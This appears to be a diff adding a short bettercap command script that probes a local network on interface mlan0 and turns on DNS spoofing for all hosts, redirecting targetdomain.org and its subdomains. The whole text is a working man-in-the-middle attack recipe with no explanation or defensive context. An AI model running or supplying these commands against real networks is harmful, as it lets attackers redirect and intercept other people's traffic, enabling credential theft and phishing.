@@ -1,0 +1,11 @@
+
+bettercap -iface mlan0
+net.probe on
+net.show
+
+# help dns.spoof
+
+set dns.spoof.all true
+set dns.spoof.domains targetdomain.org, *.targetdomain.org
+dns.spoof on
+
